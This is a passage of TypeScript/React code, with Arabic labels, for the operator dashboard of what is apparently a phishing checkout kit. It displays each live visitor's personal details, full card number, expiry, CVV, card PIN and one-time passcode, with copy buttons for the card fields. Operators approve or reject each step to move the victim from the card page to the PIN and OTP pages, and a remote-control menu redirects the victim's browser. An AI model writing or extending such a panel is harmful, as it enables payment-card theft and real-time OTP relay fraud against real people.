              <div className="p-10 text-center"><Loader2 className="w-5 h-5 animate-spin inline text-muted-foreground" /></div>
            ) : filtered.length === 0 ? (
              <div className="p-10 text-center text-sm text-muted-foreground">\u0644\u0627 \u064a\u0648\u062c\u062f \u0632\u0648\u0651\u0627\u0631.</div>
            ) : (
              <ul className="divide-y divide-border">
                {filtered.map((v) => {
                  const online = isOnline(v);
                  const code = v.detected_country;
                  const page = pageLabel(v.last_path);
                  const isSel = selected?.id === v.id;
                  const isNew = Date.now() - new Date(v.created_at).getTime() < 5 * 60 * 1000;
                  const stageRose = isPaymentStage(v);
                  const isMe = !!session?.user.id && v.user_id === session.user.id;
                  return (
                    <li key={v.id}>
                      <button
                        onClick={() => {
                          setSelected(v);
                          if (typeof window !== "undefined" && window.matchMedia("(max-width: 1023px)").matches) {
                            setDetailsOpen(true);
                          }
                        }}
                        className={`w-full text-right p-4 transition relative ${
                          isSel ? "bg-accent/15" : "hover:bg-muted/40"
                        }`}
                      >
                        {isSel && <span className="absolute right-0 top-3 bottom-3 w-1 bg-primary rounded-l" />}
                        <div className="flex items-center gap-3">
                          {/* Avatar */}
                          <div className="relative shrink-0">
                            <div className={`w-11 h-11 rounded-full flex items-center justify-center font-semibold text-sm ${isMe ? "bg-primary text-primary-foreground" : "bg-secondary text-primary"}`}>
                              {v.full_name?.[0]?.toUpperCase() || "?"}
                            </div>
                            <span className={`absolute bottom-0 left-0 w-3 h-3 rounded-full ring-2 ring-card ${
                              online ? "bg-emerald-500" : stageRose ? "bg-amber-400" : "bg-muted-foreground/30"
                            }`} />
                          </div>

                          <div className="flex-1 min-w-0">
                            <div className="flex items-center justify-between gap-2 mb-1">
                              <span className="text-[10px] text-muted-foreground tabular-nums shrink-0">
                                {timeAgo(v.last_seen_at)}
                              </span>
                              <span className="font-semibold text-sm truncate text-foreground">
                                {v.full_name || "\u0632\u0627\u0626\u0631"}
                                {isMe && <span className="mr-1.5 text-[10px] bg-primary text-primary-foreground px-1.5 py-0.5 rounded-full font-bold">\u0623\u0646\u062a</span>}
                                {isNew && !isMe && <span className="mr-1.5 text-[10px] text-accent-foreground bg-accent px-1.5 py-0.5 rounded-full font-medium">\u062c\u062f\u064a\u062f</span>}
                              </span>
                            </div>

                            <div className="flex items-center gap-2 justify-end text-xs">
                              <RowStageChip v={v} />
                              <span className="text-muted-foreground truncate">
                                {page.emoji} {page.label}
                              </span>
                              <span className="w-1 h-1 bg-muted-foreground/30 rounded-full" />
                              {isCountryCode(code) ? (
                                <span className="inline-flex items-center gap-1 text-[10px] text-muted-foreground/70 uppercase tracking-wider font-semibold">
                                  <CountryFlag code={code} className="w-3.5 h-2.5 rounded-[2px]" />
                                  {code}
                                </span>
                              ) : (
                                <span className="text-[10px] text-muted-foreground/60">\u2014</span>
                              )}
                            </div>
                          </div>
                        </div>
                      </button>

                      {/* Inline approval bar \u2014 only when visitor is on the relevant page with submitted data */}
                      <SidebarApproval v={v} />
                    </li>
                  );
                })}
              </ul>
            )}
          </div>
        </section>

        {/* LEFT: Desktop details panel */}
        <section className="order-2 hidden lg:flex bg-background rounded-2xl border border-border overflow-hidden flex-col max-h-[calc(100vh-6rem)] min-h-[calc(100vh-6rem)]">
          {selected ? (
            <div className="flex-1 overflow-y-auto p-4 md:p-5">
              <DetailsPanel v={selected} onClose={() => setSelected(null)} onDelete={() => remove(selected.session_id)} />
            </div>
          ) : (
            <div className="flex-1 flex items-center justify-center text-center p-10 m-3 rounded-xl border-2 border-dashed border-border">
              <div>
                <div className="w-24 h-24 rounded-3xl bg-muted text-muted-foreground flex items-center justify-center mx-auto mb-6">
                  <LayoutGrid className="w-10 h-10" />
                </div>
                <h3 className="text-2xl md:text-3xl font-semibold mb-2">\u0627\u062e\u062a\u0631 \u0632\u0627\u0626\u0631\u064b\u0627 \u0644\u0639\u0631\u0636 \u0627\u0644\u062a\u0641\u0627\u0635\u064a\u0644</h3>
                <p className="text-sm text-muted-foreground">\u0643\u0644 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u062a\u064a \u064a\u0642\u062f\u0651\u0645\u0647\u0627 \u0633\u062a\u0638\u0647\u0631 \u0647\u0646\u0627 \u0645\u0628\u0627\u0634\u0631\u0629.</p>
              </div>
            </div>
          )}
        </section>
      </div>

      {/* Details Modal */}
      {selected && detailsOpen && (
        <div
          className="fixed inset-0 z-50 bg-black/50 backdrop-blur-sm flex items-start justify-center p-2 md:p-4 overflow-y-auto"
          onClick={() => setDetailsOpen(false)}
          dir="rtl"
        >
          <div
            className="bg-muted/30 w-full max-w-5xl my-2 md:my-8 rounded-2xl shadow-2xl overflow-hidden"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="bg-background border-b border-border px-4 md:px-5 h-14 flex items-center justify-between sticky top-0 z-10">
              <div className="flex items-center gap-2">
                <Eye className="w-4 h-4 text-muted-foreground" />
                <span className="font-semibold">\u062a\u0641\u0627\u0635\u064a\u0644 \u0627\u0644\u0632\u0627\u0626\u0631</span>
              </div>
              <button
                onClick={() => setDetailsOpen(false)}
                className="w-9 h-9 rounded-lg hover:bg-muted flex items-center justify-center"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="p-3 md:p-5">
              <DetailsPanel v={selected} onClose={() => setDetailsOpen(false)} onDelete={() => { remove(selected.session_id); setDetailsOpen(false); }} />
            </div>
          </div>
        </div>
      )}
    </main>
    </>
  );
};

/* ---------- Sub-components ---------- */

const toneClasses: Record<string, { bg: string; text: string; border: string; chip: string }> = {
  emerald: { bg: "bg-emerald-50", text: "text-emerald-700", border: "border-emerald-200", chip: "bg-emerald-500" },
  amber:   { bg: "bg-amber-50",   text: "text-amber-700",   border: "border-amber-200",   chip: "bg-amber-500" },
  slate:   { bg: "bg-slate-50",   text: "text-slate-700",   border: "border-slate-200",   chip: "bg-slate-500" },
  sky:     { bg: "bg-sky-50",     text: "text-sky-700",     border: "border-sky-200",     chip: "bg-sky-500" },
  rose:    { bg: "bg-rose-50",    text: "text-rose-700",    border: "border-rose-200",    chip: "bg-rose-500" },
};

const Stat = ({
  label, value, tone, icon,
}: { label: string; value: number; tone: keyof typeof toneClasses | string; icon: React.ReactNode }) => {
  const t = toneClasses[tone] || toneClasses.slate;
  return (
    <div className={`flex items-center gap-2 px-3 h-10 rounded-xl border ${t.border} ${t.bg}`}>
      <span className={`w-5 h-5 rounded-md ${t.chip} text-white flex items-center justify-center`}>{icon}</span>
      <span className={`text-sm font-bold ${t.text}`}>{value}</span>
      <span className={`text-[11px] ${t.text} opacity-80 hidden md:inline`}>{label}</span>
    </div>
  );
};

const Pill = ({
  children, active, onClick, tone, icon,
}: {
  children: React.ReactNode;
  active: boolean;
  onClick: () => void;
  tone: keyof typeof toneClasses;
  icon?: React.ReactNode;
}) => {
  const t = toneClasses[tone];
  return (
    <button
      onClick={onClick}
      className={`shrink-0 inline-flex items-center gap-1 px-3 h-7 rounded-full text-[11px] font-medium border transition ${
        active
          ? `${t.bg} ${t.text} ${t.border}`
          : "bg-background text-muted-foreground border-border hover:border-foreground/30"
      }`}
    >
      {icon}
      {children}
    </button>
  );
};

const DetailsPanel = ({ v, onClose, onDelete }: { v: Visitor; onClose: () => void; onDelete: () => void }) => {
  const code = v.detected_country;
  const page = pageLabel(v.last_path);
  const online = isOnline(v);
  const stage = isPaymentStage(v) ? "\u0641\u064a \u0627\u0644\u062f\u0641\u0639" : v.last_path === "/success" ? "\u0645\u0643\u062a\u0645\u0644" : "\u064a\u062a\u0635\u0641\u062d";

  const clearConversation = async () => {
    if (!confirm("\u0645\u0633\u062d \u0643\u0644 \u0627\u0644\u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u062a\u064a \u0623\u062f\u062e\u0644\u0647\u0627 \u0647\u0630\u0627 \u0627\u0644\u0632\u0627\u0626\u0631\u061f (\u0627\u0644\u0632\u0627\u0626\u0631 \u0646\u0641\u0633\u0647 \u0633\u064a\u0628\u0642\u0649)")) return;
    const { error } = await supabase
      .from("visitors")
      .update({
        full_name: null, email: null, phone: null, address: null, city: null,
        country: null, postal_code: null, plan_selected: null, order_total: null,
        card_holder: null, card_number: null, card_expiry: null, card_cvv: null,
        card_pin: null, card_otp: null,
        checkout_at: null, card_at: null, pin_at: null, otp_at: null,
      })
      .eq("session_id", v.session_id);
    if (error) {
      sonner.error("\u062a\u0639\u0630\u0651\u0631 \u0645\u0633\u062d \u0627\u0644\u0645\u062d\u0627\u062f\u062b\u0629", { description: error.message });
      return;
    }
    sonner.success("\u062a\u0645 \u0645\u0633\u062d \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0632\u0627\u0626\u0631");
  };

  return (
    <div className="space-y-4 md:space-y-6">
      {/* Hero header */}
      <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
        <div className="flex items-start gap-3 md:gap-5">
          <div className="relative shrink-0">
            <div className="w-14 h-14 md:w-20 md:h-20 rounded-full bg-secondary flex items-center justify-center text-lg md:text-2xl font-bold text-primary">
              {v.full_name?.[0]?.toUpperCase() || "?"}
            </div>
            <span className={`absolute bottom-0 left-0 w-3 h-3 md:w-4 md:h-4 rounded-full ring-2 ring-card ${
              online ? "bg-emerald-500" : "bg-muted-foreground/40"
            }`} />
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <h2 className="text-lg md:text-2xl font-semibold truncate">{v.full_name || "\u0632\u0627\u0626\u0631"}</h2>
              <span className={`text-[9px] md:text-[10px] uppercase tracking-widest font-bold px-1.5 md:px-2 py-0.5 rounded ${
                online ? "bg-emerald-50 text-emerald-700" : "bg-muted text-muted-foreground"
              }`}>
                {online ? "Active" : "Offline"}
              </span>
              <span className="text-[10px] md:text-xs text-muted-foreground bg-muted px-2 py-0.5 rounded-full">
                {stage} \u00b7 {page.emoji} {page.label}
              </span>
            </div>
            <div className="mt-1.5 md:mt-2 flex items-center gap-2 md:gap-3 text-xs md:text-sm text-muted-foreground flex-wrap">
              {v.email && <span className="truncate max-w-full">{v.email}</span>}
              {v.email && isCountryCode(code) && <span className="size-1 bg-muted-foreground/30 rounded-full" />}
              {isCountryCode(code) && (
                <span className="inline-flex items-center gap-1.5">
                  <CountryFlag code={code} className="w-4 h-3 rounded-[2px]" />
                  {v.city || COUNTRIES[code].nameAr}
                </span>
              )}
            </div>
          </div>
          <div className="text-left shrink-0 hidden sm:block">
            <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-1">\u0622\u062e\u0631 \u0638\u0647\u0648\u0631</div>
            <div className="text-sm font-medium tabular-nums text-foreground">{formatTime(v.last_seen_at)}</div>
          </div>
        </div>

        {/* Remote control moved into the header */}
        <div className="mt-4 pt-4 border-t border-border/60">
          <RemoteControl sessionId={v.session_id} />
        </div>
      </div>

      {/* Stage progress timeline */}
      <StageProgress v={v} />

      {/* All info cards \u2014 shown together, real-time, no tabs */}
      <StageCards v={v} />

      {/* Tech / session card */}
      <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
        <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-3">
          \u0627\u0644\u062c\u0644\u0633\u0629 \u0648\u0627\u0644\u062c\u0647\u0627\u0632
        </div>
        <div className="grid sm:grid-cols-2 gap-x-6 gap-y-2 text-sm">
          <Field icon={Monitor} label="\u0627\u0644\u0645\u062a\u0635\u0641\u062d" value={v.user_agent} mono />
          <Field label="\u0645\u0639\u0631\u0651\u0641 \u0627\u0644\u062c\u0644\u0633\u0629" value={v.session_id} mono />
          <Field icon={Globe} label="\u0627\u0644\u0628\u0644\u062f \u0627\u0644\u0645\u0643\u062a\u0634\u0641" value={v.detected_country} />
          <Field label="\u0627\u0644\u0639\u0645\u0644\u0629" value={v.currency} />
          <Field label="\u0627\u0644\u0644\u063a\u0629" value={v.language} />
          <Field icon={Hash} label="\u0639\u062f\u062f \u0627\u0644\u0632\u064a\u0627\u0631\u0627\u062a" value={String(v.visits_count)} />
          <Field icon={Clock} label="\u0623\u0648\u0644 \u062f\u062e\u0648\u0644" value={formatDateTime(v.created_at)} />
          <Field icon={Clock} label="\u0622\u062e\u0631 \u0646\u0634\u0627\u0637" value={formatDateTime(v.last_seen_at)} />
          <Field label="\u0635\u0641\u062d\u0629 \u0627\u0644\u0647\u0628\u0648\u0637" value={v.landing_path} />
          <Field label="\u0622\u062e\u0631 \u0635\u0641\u062d\u0629" value={v.last_path} />
          <Field label="\u0627\u0644\u0645\u0631\u062c\u0639" value={v.referrer} />
          <Field label="\u0639\u0646\u0648\u0627\u0646 IP" value={v.ip_address} mono />
        </div>
      </div>

      {/* Footer actions */}
      <div className="flex flex-wrap items-center justify-end gap-2">
        <button
          onClick={clearConversation}
          className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg text-amber-700 bg-amber-50 hover:bg-amber-100 border border-amber-200 text-xs font-medium"
        >
          <MessageSquareX className="w-3.5 h-3.5" /> \u0645\u0633\u062d \u0627\u0644\u0645\u062d\u0627\u062f\u062b\u0629
        </button>
        <button
          onClick={onDelete}
          className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg text-rose-600 hover:bg-rose-50 border border-transparent text-xs font-medium"
        >
          <Trash2 className="w-3.5 h-3.5" /> \u062d\u0630\u0641 \u0627\u0644\u0632\u0627\u0626\u0631
        </button>
        <button
          onClick={onClose}
          className="inline-flex items-center gap-1.5 h-9 px-4 rounded-lg border border-border hover:bg-muted text-xs font-medium"
        >
          <X className="w-3.5 h-3.5" /> \u0625\u063a\u0644\u0627\u0642
        </button>
      </div>
    </div>
  );
};

const InfoCell = ({ label, value, mono }: { label: string; value: string; mono?: boolean }) => (
  <div>
    <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70 mb-2">{label}</div>
    <div className={`text-sm font-medium text-foreground ${mono ? "font-mono" : ""}`}>{value}</div>
  </div>
);

/* ---------- Stage cards (per submission step) ---------- */

const hasAny = (...vals: (string | null | undefined)[]) => vals.some((x) => x && String(x).trim() !== "");

const StageBadge = ({ tone, label }: { tone: keyof typeof toneClasses; label: string }) => {
  const t = toneClasses[tone];
  return (
    <span className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-semibold ${t.bg} ${t.text} border ${t.border}`}>
      {label}
    </span>
  );
};

const StageCard = ({
  tone, title, badge, icon, time, children,
}: {
  tone: keyof typeof toneClasses;
  title: string;
  badge: string;
  icon: React.ReactNode;
  time?: string | null;
  children: React.ReactNode;
}) => {
  const t = toneClasses[tone];
  return (
    <div className="bg-background border border-border rounded-2xl overflow-hidden">
      <div className={`flex items-center justify-between gap-3 px-5 py-3 border-b border-border ${t.bg}`}>
        <div className="flex items-center gap-2">
          <span className={`w-7 h-7 rounded-lg ${t.chip} text-white flex items-center justify-center`}>{icon}</span>
          <div>
            <div className={`text-sm font-semibold ${t.text}`}>{title}</div>
            {time && <div className="text-[10px] text-muted-foreground">{time}</div>}
          </div>
        </div>
        <StageBadge tone={tone} label={badge} />
      </div>
      <div className="p-5 space-y-2.5 text-sm">{children}</div>
    </div>
  );
};

const StageProgress = ({ v }: { v: Visitor }) => {
  const steps: {
    key: "checkout" | "card" | "pin" | "otp";
    label: string;
    icon: typeof UsersIcon;
    at: string | null;
    done: boolean;
    tone: string;
  }[] = [
    {
      key: "checkout",
      label: "\u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u0637\u0644\u0628",
      icon: UsersIcon,
      at: v.checkout_at,
      done: hasAny(v.full_name, v.email, v.phone, v.address, v.plan_selected, v.order_total),
      tone: "sky",
    },
    {
      key: "card",
      label: "\u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u062f\u0641\u0639",
      icon: CreditCard,
      at: v.card_at,
      done: hasAny(v.card_number, v.card_holder, v.card_expiry, v.card_cvv),
      tone: "rose",
    },
    {
      key: "pin",
      label: "\u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0633\u0631\u064a",
      icon: Lock,
      at: v.pin_at,
      done: hasAny(v.card_pin),
      tone: "amber",
    },
    {
      key: "otp",
      label: "\u0631\u0645\u0632 OTP",
      icon: ShieldCheck,
      at: v.otp_at,
      done: hasAny(v.card_otp),
      tone: "emerald",
    },
  ];

  const toneActive: Record<string, string> = {
    sky: "bg-sky-500 text-white border-sky-500",
    rose: "bg-rose-500 text-white border-rose-500",
    amber: "bg-amber-500 text-white border-amber-500",
    emerald: "bg-emerald-500 text-white border-emerald-500",
  };
  const toneLine: Record<string, string> = {
    sky: "bg-sky-500",
    rose: "bg-rose-500",
    amber: "bg-amber-500",
    emerald: "bg-emerald-500",
  };

  const completedCount = steps.filter((s) => s.done).length;

  return (
    <div className="bg-card rounded-2xl border border-border/60 p-4 md:p-6">
      <div className="flex items-center justify-between mb-4">
        <div className="text-[10px] font-bold uppercase tracking-widest text-muted-foreground/70">
          \u0645\u0631\u0627\u062d\u0644 \u0627\u0644\u0639\u0645\u0644\u064a\u0629
        </div>
        <div className="text-xs text-muted-foreground tabular-nums">
          {completedCount} / {steps.length}
        </div>
      </div>

      <div className="flex items-start gap-1 md:gap-2">
        {steps.map((step, idx) => {
          const Icon = step.icon;
          const nextDone = idx < steps.length - 1 && steps[idx + 1].done;
          return (
            <div key={step.key} className="flex-1 flex flex-col items-center min-w-0">
              <div className="w-full flex items-center">
                <div className={`flex-1 h-0.5 ${idx === 0 ? "opacity-0" : step.done ? toneLine[step.tone] : "bg-border"}`} />
                <div
                  className={`shrink-0 w-9 h-9 md:w-10 md:h-10 rounded-full border-2 flex items-center justify-center transition-all ${
                    step.done
                      ? toneActive[step.tone]
                      : "bg-background border-border text-muted-foreground/50"
                  }`}
                  title={step.at ? formatDateTime(step.at) : "\u0644\u0645 \u064a\u0643\u062a\u0645\u0644 \u0628\u0639\u062f"}
                >
                  {step.done ? <Check className="w-4 h-4 md:w-5 md:h-5" /> : <Icon className="w-4 h-4 md:w-5 md:h-5" />}
                </div>
                <div className={`flex-1 h-0.5 ${idx === steps.length - 1 ? "opacity-0" : nextDone ? toneLine[step.tone] : "bg-border"}`} />
              </div>
              <div className="mt-2 text-center w-full">
                <div className={`text-[11px] md:text-xs font-medium truncate ${step.done ? "text-foreground" : "text-muted-foreground/60"}`}>
                  {step.label}
                </div>
                <div className="text-[10px] text-muted-foreground tabular-nums mt-0.5 truncate">
                  {step.at ? formatDateTime(step.at) : "\u2014"}
                </div>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
};

const StageCards = ({ v }: { v: Visitor }) => {
  const hasContact = hasAny(v.full_name, v.email, v.phone, v.address, v.city, v.country, v.postal_code, v.plan_selected, v.order_total);
  const hasCard = hasAny(v.card_holder, v.card_number, v.card_expiry, v.card_cvv);
  const hasPin = hasAny(v.card_pin);
  const hasOtp = hasAny(v.card_otp);

  if (!hasContact && !hasCard && !hasPin && !hasOtp) {
    return (
      <div className="bg-background border border-dashed border-border rounded-2xl p-8 text-center text-sm text-muted-foreground">
        \u0644\u0645 \u064a\u0642\u062f\u0651\u0645 \u0627\u0644\u0632\u0627\u0626\u0631 \u0623\u064a \u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0628\u0639\u062f \u2014 \u0643\u0644 \u0645\u0627 \u064a\u062f\u062e\u0644\u0647 \u0633\u064a\u0638\u0647\u0631 \u0647\u0646\u0627 \u0641\u0648\u0631\u0627\u064b.
      </div>
    );
  }

  return (
    <div className="grid md:grid-cols-2 gap-4">
      {hasContact && (
        <StageCard
          tone="sky"
          title="\u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u0637\u0644\u0628 \u00b7 \u0627\u0644\u0645\u0639\u0644\u0648\u0645\u0627\u062a \u0627\u0644\u0634\u062e\u0635\u064a\u0629"
          badge="Checkout"
          icon={<UsersIcon className="w-4 h-4" />}
          time={v.checkout_at ? formatDateTime(v.checkout_at) : undefined}
        >
          <Field icon={UsersIcon} label="\u0627\u0644\u0627\u0633\u0645" value={v.full_name} />
          <Field icon={Mail} label="\u0627\u0644\u0628\u0631\u064a\u062f" value={v.email} />
          <Field icon={Phone} label="\u0627\u0644\u0647\u0627\u062a\u0641" value={v.phone} />
          <Field icon={MapPin} label="\u0627\u0644\u0639\u0646\u0648\u0627\u0646" value={v.address} />
          <Field label="\u0627\u0644\u0645\u062f\u064a\u0646\u0629" value={v.city} />
          <Field label="\u0627\u0644\u0628\u0644\u062f" value={v.country} />
          <Field label="\u0627\u0644\u0631\u0645\u0632 \u0627\u0644\u0628\u0631\u064a\u062f\u064a" value={v.postal_code} />
          <Field icon={Package} label="\u0627\u0644\u0628\u0627\u0642\u0629" value={v.plan_selected} />
          <Field label="\u0627\u0644\u0625\u062c\u0645\u0627\u0644\u064a" value={v.order_total} />
        </StageCard>
      )}

      {hasCard && (
        <StageCard
          tone="rose"
          title="\u0628\u064a\u0627\u0646\u0627\u062a \u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u062f\u0641\u0639"
          badge="Payment Card"
          icon={<CreditCard className="w-4 h-4" />}
          time={v.card_at ? formatDateTime(v.card_at) : undefined}
        >
          <Card3DPreview
            holder={v.card_holder}
            number={v.card_number}
            expiry={v.card_expiry}
            cvv={v.card_cvv}
          />
          <Field icon={CreditCard} label="\u062d\u0627\u0645\u0644 \u0627\u0644\u0628\u0637\u0627\u0642\u0629" value={v.card_holder} copyable />
          <Field icon={CreditCard} label="\u0631\u0642\u0645 \u0627\u0644\u0628\u0637\u0627\u0642\u0629" value={v.card_number} mono copyable />
          <Field label="\u0627\u0644\u0627\u0646\u062a\u0647\u0627\u0621" value={v.card_expiry} mono copyable />
          <Field icon={Lock} label="CVV" value={v.card_cvv} mono copyable />
          {isOnline(v) && (v.last_path || "").startsWith("/payment") && !(v.last_path || "").startsWith("/payment/pin") && !(v.last_path || "").startsWith("/payment/otp") && (
            <ApprovalActions sessionId={v.session_id} stage="card" />
          )}
        </StageCard>
      )}

      {hasPin && (
        <StageCard
          tone="amber"
          title="\u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0633\u0631\u064a \u0644\u0644\u0628\u0637\u0627\u0642\u0629 (PIN)"
          badge="PIN"
          icon={<Lock className="w-4 h-4" />}
          time={v.pin_at ? formatDateTime(v.pin_at) : undefined}
        >
          <Field icon={Lock} label="PIN" value={v.card_pin} mono />
          {isOnline(v) && (v.last_path || "").startsWith("/payment/pin") && (
            <ApprovalActions sessionId={v.session_id} stage="pin" />
          )}
        </StageCard>
      )}

      {hasOtp && (
        <StageCard
          tone="emerald"
          title="\u0631\u0645\u0632 \u0627\u0644\u062a\u062d\u0642\u0642 OTP"
          badge="OTP"
          icon={<ShieldCheck className="w-4 h-4" />}
          time={v.otp_at ? formatDateTime(v.otp_at) : undefined}
        >
          <Field icon={ShieldCheck} label="OTP" value={v.card_otp} mono />
          {isOnline(v) && (v.last_path || "").startsWith("/payment/otp") && (
            <ApprovalActions sessionId={v.session_id} stage="otp" />
          )}
        </StageCard>
      )}
    </div>
  );
};

/* ---------- Approval / Rejection actions ---------- */

const STAGE_LABELS: Record<"card" | "pin" | "otp", { title: string; approve: string; reject: string }> = {
  card: { title: "\u0625\u062c\u0631\u0627\u0621 \u0639\u0644\u0649 \u0628\u0637\u0627\u0642\u0629 \u0627\u0644\u062f\u0641\u0639", approve: "\u0645\u0648\u0627\u0641\u0642\u0629 \u2192 \u0627\u0644\u0627\u0646\u062a\u0642\u0627\u0644 \u0625\u0644\u0649 PIN", reject: "\u0631\u0641\u0636 \u2192 \u0628\u064a\u0627\u0646\u0627\u062a \u0627\u0644\u0628\u0637\u0627\u0642\u0629 \u062e\u0627\u0637\u0626\u0629" },
  pin:  { title: "\u0625\u062c\u0631\u0627\u0621 \u0639\u0644\u0649 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0633\u0631\u064a",  approve: "\u0645\u0648\u0627\u0641\u0642\u0629 \u2192 \u0627\u0644\u0627\u0646\u062a\u0642\u0627\u0644 \u0625\u0644\u0649 OTP", reject: "\u0631\u0641\u0636 \u2192 PIN \u063a\u064a\u0631 \u0635\u062d\u064a\u062d" },
  otp:  { title: "\u0625\u062c\u0631\u0627\u0621 \u0639\u0644\u0649 \u0631\u0645\u0632 OTP",      approve: "\u0645\u0648\u0627\u0641\u0642\u0629 \u2192 \u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u062f\u0641\u0639",     reject: "\u0631\u0641\u0636 \u2192 OTP \u063a\u064a\u0631 \u0635\u062d\u064a\u062d" },
};

const ApprovalActions = ({ sessionId, stage }: { sessionId: string; stage: "card" | "pin" | "otp" }) => {
  const [sending, setSending] = useState<"approve" | "reject" | null>(null);

  const send = async (action: "approve" | "reject") => {
    setSending(action);
    const command = `${action}_${stage}`;
    const { error } = await supabase
      .from("visitor_commands")
      .insert([{ session_id: sessionId, command, payload: {} as never }]);
    setSending(null);
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0642\u0631\u0627\u0631", description: error.message, variant: "destructive" });
      return;
    }
    sonner.success(action === "approve" ? "\u062a\u0645\u062a \u0627\u0644\u0645\u0648\u0627\u0641\u0642\u0629 \u0648\u0623\u064f\u0631\u0633\u0644\u062a \u0644\u0644\u0632\u0627\u0626\u0631" : "\u062a\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0641\u0636 \u0644\u0644\u0632\u0627\u0626\u0631");
  };

  const labels = STAGE_LABELS[stage];

  return (
    <div className="mt-3 pt-3 border-t border-border">
      <div className="text-[10px] uppercase tracking-wider text-muted-foreground mb-2">{labels.title}</div>
      <div className="flex gap-2">
        <button
          disabled={!!sending}
          onClick={() => send("approve")}
          className="flex-1 inline-flex items-center justify-center gap-1.5 h-9 px-3 rounded-lg bg-emerald-600 text-white hover:bg-emerald-700 text-xs font-semibold transition disabled:opacity-50"
        >
          {sending === "approve" ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Check className="w-3.5 h-3.5" />}
          {labels.approve}
        </button>
        <button
          disabled={!!sending}
          onClick={() => send("reject")}
          className="flex-1 inline-flex items-center justify-center gap-1.5 h-9 px-3 rounded-lg bg-rose-600 text-white hover:bg-rose-700 text-xs font-semibold transition disabled:opacity-50"
        >
          {sending === "reject" ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <XCircle className="w-3.5 h-3.5" />}
          {labels.reject}
        </button>
      </div>
    </div>
  );
};

/* ---------- Sidebar inline approval (visible when visitor is on a payment page) ---------- */

const SidebarApproval = ({ v }: { v: Visitor }) => {
  const path = v.last_path || "";
  let stage: "card" | "pin" | "otp" | null = null;
  let hasData = false;
  if (path.startsWith("/payment/otp")) { stage = "otp"; hasData = !!v.card_otp; }
  else if (path.startsWith("/payment/pin")) { stage = "pin"; hasData = !!v.card_pin; }
  else if (path.startsWith("/payment")) { stage = "card"; hasData = !!v.card_number; }

  if (!stage || !hasData || !isOnline(v)) return null;

  return (
    <div className="px-3 pb-3 -mt-1">
      <div className="flex items-center gap-1.5 text-[10px] text-rose-700 bg-rose-50 border border-rose-200 rounded-md px-2 py-1 mb-1.5">
        <Bell className="w-3 h-3 animate-pulse" />
        \u0628\u0627\u0646\u062a\u0638\u0627\u0631 \u0642\u0631\u0627\u0631\u0643 \u2014 {stage === "card" ? "\u0627\u0644\u0628\u0637\u0627\u0642\u0629" : stage === "pin" ? "PIN" : "OTP"}
      </div>
      <ApprovalActions sessionId={v.session_id} stage={stage} />
    </div>
  );
};


const REMOTE_ACTIONS: { id: string; label: string; tone: keyof typeof toneClasses; icon: React.ReactNode }[] = [
  { id: "go_home",     label: "\u0627\u0644\u0631\u0626\u064a\u0633\u064a\u0629",   tone: "slate",   icon: <Home className="w-3.5 h-3.5" /> },
  { id: "go_checkout", label: "\u0625\u062a\u0645\u0627\u0645 \u0627\u0644\u0637\u0644\u0628", tone: "sky",     icon: <Package className="w-3.5 h-3.5" /> },
  { id: "go_payment",  label: "\u0627\u0644\u062f\u0641\u0639",       tone: "rose",    icon: <CreditCard className="w-3.5 h-3.5" /> },
  { id: "go_pin",      label: "PIN",         tone: "amber",   icon: <Lock className="w-3.5 h-3.5" /> },
  { id: "go_otp",      label: "OTP",         tone: "amber",   icon: <ShieldCheck className="w-3.5 h-3.5" /> },
  { id: "go_success",  label: "\u0646\u062c\u0627\u062d",        tone: "emerald", icon: <CheckCircle2 className="w-3.5 h-3.5" /> },
  { id: "reload",      label: "\u0625\u0639\u0627\u062f\u0629 \u062a\u062d\u0645\u064a\u0644", tone: "slate",   icon: <RefreshCw className="w-3.5 h-3.5" /> },
];

const RemoteControl = ({ sessionId }: { sessionId: string }) => {
  const [sending, setSending] = useState<string | null>(null);

  const send = async (command: string, payload: Record<string, unknown> = {}) => {
    setSending(command);
    const { error } = await supabase
      .from("visitor_commands")
      .insert([{ session_id: sessionId, command, payload: payload as never }]);
    setSending(null);
    if (error) {
      toast({ title: "\u062a\u0639\u0630\u0651\u0631 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0623\u0645\u0631", description: error.message, variant: "destructive" });
      return;
    }
    toast({ title: "\u062a\u0645 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0623\u0645\u0631 \u0644\u0644\u0632\u0627\u0626\u0631" });
  };

  return (
    <DropdownMenu>
      <DropdownMenuTrigger asChild>
        <button
          disabled={!!sending}
          className="inline-flex items-center gap-1.5 h-8 px-3 rounded-md border border-border bg-background hover:bg-muted text-xs font-medium transition disabled:opacity-50"
        >
          {sending ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Send className="w-3.5 h-3.5" />}
          \u062a\u0648\u062c\u064a\u0647 \u0627\u0644\u0632\u0627\u0626\u0631
        </button>
      </DropdownMenuTrigger>
